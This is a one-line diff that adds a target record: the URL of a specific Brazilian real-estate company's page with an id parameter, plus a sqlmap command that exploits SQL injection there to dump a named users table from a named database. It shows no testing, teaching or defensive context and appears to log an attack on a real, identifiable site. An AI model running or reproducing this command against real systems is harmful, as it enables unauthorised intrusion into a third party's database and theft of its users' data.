@@ -1,0 +1,1 @@
+http://www.ewmincorporadora.com.br/imovel?id=47 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.ewmincorporadora.com.br/imovel?id=47 -D grupoewm_incorporadora -T ewm_inc_sec_users --dump
